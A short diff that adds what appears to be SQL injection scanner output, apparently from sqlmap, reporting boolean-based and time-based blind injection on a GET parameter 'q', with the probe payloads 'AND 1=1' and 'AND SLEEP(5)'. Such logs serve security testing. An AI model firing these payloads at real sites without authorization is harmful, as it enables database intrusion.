@@ -1,0 +1,10 @@
+[INFO] testing connection to the target URL
+[INFO] testing if the target URL content is stable
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=1 AND 1=1
+Parameter: q (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: q=1 AND SLEEP(5)
